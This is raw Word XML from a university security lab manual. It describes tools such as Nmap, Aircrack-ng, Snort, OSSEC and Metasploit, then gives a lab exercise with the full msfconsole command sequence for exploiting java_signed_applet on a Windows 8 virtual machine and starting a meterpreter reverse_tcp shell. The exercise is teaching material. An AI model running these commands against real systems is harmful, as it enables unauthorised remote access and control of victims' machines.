          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>upgrade schedules and monitoring host or service uptime. It uses raw IP packets in novel ways to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use etc. It was designed to work on large networks but works fine against single hosts. It supports most of the OS like Linux, Windows, FreeBSD, OpenBSD, Solaris, Mac OS X etc.</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Aircrack-ng</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:ind w:left="43" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>It is a complete suite of tools to assess WiFi network security. It focusses on different areas of WiFi security:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="763" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Monitoring- Packet capture and export of data to text files for further processing by third party tools.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="763" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Attacking- Replay attacks, deauthentication, fake access points and others via packet injection.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="763" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Testing- Checking WiFi cards and driver capabilities (capture and injection).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="763" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Cracking- WEP and WPA PSK( WPA 1 and 2)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:right="48" w:firstLine="403"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>All tools are command line which allows for heavy scripting. It works primarily on Linux but covers other OS also. The aircrack-ng software suite includes: airmon-ng, aireplay-ng, airodump-ng, aircrack-ng, airdecap-ng, ivstools etc.</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Google Rapid Response(GRR)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48" w:firstLine="672"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>It is an incident response framework focused on remote live forensics. It is based on client server architecture, so there is an agent which is installed on target machines and python server infrastructure that can manage and communicated with the agents. Cross-platform support for Linux, OS X and Windows clients is there.</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Nikto</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>It is a web server scanner that tests web servers for dangerous files/CGIs, outdated server software and other problems. It performs generic and server type specific checks. It also captures and prints any cookies received. It also checks for server configuration items such as the presence of multiple index files, HTTP server options and will attempt to identity installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.</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Snort</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">It is an open source network-based intrusion detection system (NIDS) that has the ability to perform real-time traffic analysis and packet logging on Internet Protocol (IP) networks. It performs protocol analysis, content searching and matching. The program can also be used to </w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">detect probes or attacks, including but not limited to operating system fingerprinting attempts, semantic URL attacks, buffer overflows, server message block probes and stealth port scans. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48" w:firstLine="672"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Snort can be configured in three main modes: sniffer, packet logger and network intrusion detection. In sniffer mode, the program will read network packets and display them on the console. In packet logger mode, the program will log packets to the disk. In intrusion detection mode, the program will monitor network traffic and analyze it against a rule set defined by the user. The program will then perform a specific action based on what has been identified.</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OSSEC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>It is a free, open-source host-based intrusion detection system (HIDS). It performs log analysis, integrity checking, Windows registry monitoring, rootkit detection, time-based alerting and active response. It provides intrusion detection for most operating systems that includes Linux, OpenBSD, FreeBSD, OS X, Solaris and Windows. It has a centralized, cross-platform architecture allowing multiple systems to be easily monitored and managed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48" w:firstLine="672"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>It is one of the most powerful tools used for penetration testing. It comes in two versions: commercial and free edition. It offers lots of tools that range from scanning utilities to easy to launch exploits that include encoders used to bypass common security defenses. It is by default available in KaliLinux. It can also be separately installed to run on other Linux distributions, Windows or in Mac OS X. In KaliLinux, it can be executed in command line mode ie. msfconsole or through GUI mode ie. Armitage. It can perform multiple tasks through the life cycle of penetration testing. The various phases of penetration testing are- information gathering, enumeration, gaining access, privilege escalation, maintaining access and covering tracks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pP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Result:</w:t>
      </w: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jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pP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lastRenderedPageBreak/>
        <w:t>Ex. No.:</w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>17b</w:t>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r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>Date:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>METASPLOIT FRAMEWORK</w:t>
      </w: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Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>To set up Metasploit framework and to exploitjava_signed_applet in Windows 8 machine remotely.</w:t>
      </w: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Algorithm:</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Download the latest version of VirtualBox from https://www.virtualbox.org/wiki/Downloads and install.</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Download the latest version of KaliLinux from https://www.kali.org/downloads/ and install in VirtualBox.</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Install the victim Windows 8 machine image in VirtualBox.</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In KaliLinux, open the metasploit console.</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Search for java_signed_ applet in KaliLinux for exploitation.</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If java_signed_applet found, then perform exploit with use command.</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To get more information about exploit type info command.</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To get more exploit options type show options command.</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Set RHOST with remote victim machine IP address.</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Set target windows 8 machine to attack.</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Set LHOST with local IP address.</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Next, we set the payload with meterpreter.</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Set the URIPATH on victim Windows 8 machine.</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Attack the victim machine with exploit command.</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Send the URL to victim machine to start meterpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="360" w:lineRule="auto"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Using meterpreter run system commands to attack in victim machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pP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Output:</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root@kali:~#msfconsole</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msf&gt; search java signed</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msf&gt; use exploit/multi/browser/java_signed_applet</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info</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show options</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&gt;ifconfig</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set RHOST 192.168.1.100</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lastRenderedPageBreak/>
        <w:t>msf exploit(java_signed_applet) &gt; set target 1</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set LHOST 192.168.1.110</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set payload windows/meterpreter/reverse_tcp</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set URIPATH /</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exploit</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msf exploit(java_signed_applet) &gt; [*] using URL:  http://192.168.1.110:8000/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>meterpreter&gt;sysinfo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRDefault="00964394"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p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="000F3373" w:rsidSect="00453209">
      <w:footerReference w:type="default" r:id="rId93"/>
      <w:pgSz w:w="11900" w:h="16838"/>
      <w:pgMar w:top="1440" w:right="940" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
      <w:cols w:space="720" w:equalWidth="0">
        <w:col w:w="952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0EC" w:rsidRDefault="00D760EC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00D760EC" w:rsidRDefault="00D7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charset w:val="80"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
  </w:font>
  <w:font w:name="DejaVu Sans">
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E7002EFF" w:usb1="D200FDFF" w:usb2="0A24602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charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="DejaVu Serif">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94" w:rsidRDefault="00964394" w:rsidP="00964394">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:pBdr>
        <w:top w:val="thinThickSmallGap" w:sz="24" w:space="1" w:color="622423"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="8320"/>
      </w:tabs>
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
        <w:lang w:val="en-US"/>
      </w:rPr>
      <w:t>SECURITY LAB- CS6711</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
      </w:rPr>
      <w:tab/>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="008B0F50" w:rsidRPr="008B0F50">
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
        <w:noProof/>
      </w:rPr>
      <w:t>4</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
  </w:p>
  <w:p w:rsidR="00964394" w:rsidRDefault="00964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F7" w:rsidRDefault="004C26F7">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="008B0F50">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>12</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
  </w:p>
  <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7">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F7" w:rsidRDefault="00E07A44">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact"/>
    </w:pPr>
    <w:r w:rsidRPr="00623CEC">
      <w:rPr>
        <w:noProof/>
        <w:lang w:eastAsia="en-US"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="page">
                <wp:posOffset>3714750</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>9801225</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="203200" cy="17780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F7" w:rsidRDefault="004C26F7">
                          <w:pPr>
                            <w:spacing w:line="260" w:lineRule="exact"/>
                            <w:ind w:left="40"/>
                          </w:pPr>
                          <w:r>
                            <w:fldChar w:fldCharType="begin"/>
                          </w:r>
                          <w:r>
                            <w:instrText xml:space="preserve"> PAGE </w:instrText>
                          </w:r>
                          <w:r>
                            <w:fldChar w:fldCharType="separate"/>
                          </w:r>
                          <w:r w:rsidR="00BB0B42">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26" type="#_x0000_t202" style="position:absolute;margin-left:292.5pt;margin-top:771.75pt;width:1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" filled="f" stroked="f">
              <v:path arrowok="t"/>
              <v:textbox inset="0,0,0,0">
                <w:txbxContent>
                  <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7">
                    <w:pPr>
                      <w:spacing w:line="260" w:lineRule="exact"/>
                      <w:ind w:left="40"/>
                    </w:pPr>
                    <w:r>
                      <w:fldChar w:fldCharType="begin"/>
                    </w:r>
                    <w:r>
                      <w:instrText xml:space="preserve"> PAGE </w:instrText>
                    </w:r>
                    <w:r>
                      <w:fldChar w:fldCharType="separate"/>
                    </w:r>
                    <w:r w:rsidR="00BB0B42">
                      <w:rPr>
                        <w:noProof/>
                      </w:rPr>
                      <w:t>44</w:t>
                    </w:r>
                    <w:r>
                      <w:fldChar w:fldCharType="end"/>
                    </w:r>
                  </w:p>
                </w:txbxContent>
              </v:textbox>
              <w10:wrap anchorx="page" anchory="page"/>
            </v:shape>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
  </w:p>
  <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7"/>
  <w:p w:rsidR="004C26F7" w:rsidRDefault="00E07A44">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact"/>
    </w:pPr>
    <w:r w:rsidRPr="00623CEC">
      <w:rPr>
        <w:noProof/>
        <w:lang w:eastAsia="en-US"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251657216" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="page">
                <wp:posOffset>3714750</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>9801225</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="203200" cy="177800"/>
              <wp:effectExtent l="0" t="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F7" w:rsidRDefault="004C26F7">
                          <w:pPr>
                            <w:spacing w:line="260" w:lineRule="exact"/>
                            <w:ind w:left="40"/>
                          </w:pPr>
                          <w:r>
                            <w:fldChar w:fldCharType="begin"/>
                          </w:r>
                          <w:r>
                            <w:instrText xml:space="preserve"> PAGE </w:instrText>
                          </w:r>
                          <w:r>
                            <w:fldChar w:fldCharType="separate"/>
                          </w:r>
                          <w:r w:rsidR="00BB0B42">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27" type="#_x0000_t202" style="position:absolute;margin-left:292.5pt;margin-top:771.75pt;width:16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" filled="f" stroked="f">
              <v:path arrowok="t"/>
              <v:textbox inset="0,0,0,0">
                <w:txbxContent>
                  <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7">
                    <w:pPr>
                      <w:spacing w:line="260" w:lineRule="exact"/>
                      <w:ind w:left="40"/>
                    </w:pPr>
                    <w:r>
                      <w:fldChar w:fldCharType="begin"/>
                    </w:r>
                    <w:r>
                      <w:instrText xml:space="preserve"> PAGE </w:instrText>
                    </w:r>
                    <w:r>
                      <w:fldChar w:fldCharType="separate"/>
                    </w:r>
                    <w:r w:rsidR="00BB0B42">
                      <w:rPr>
                        <w:noProof/>
                      </w:rPr>
                      <w:t>44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6F7" w:rsidRDefault="004C26F7">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00BB0B42">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>50</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
  </w:p>
  <w:p w:rsidR="004C26F7" w:rsidRDefault="004C2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0EC" w:rsidRDefault="00D760EC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00D760EC" w:rsidRDefault="00D7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abstractNum w:abstractNumId="0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000001"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4E6AFB6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44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5"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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000C"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="0000000C"/>
    <w:name w:val="WW8Num12"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="nothing"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0000000D"/>
    <w:name w:val="WW8Num1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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0000000E"/>
    <w:name w:val="WW8Num14"/>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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0000000F"/>
    <w:name w:val="WW8Num15"/>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10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00601FAE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="11869C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05DF4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="283A950A"/>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C4F21"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AA561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C6B9F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E7449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B4F47"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3A7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957AD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C0A4E3B2"/>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861CC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="17988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F7A96"/>
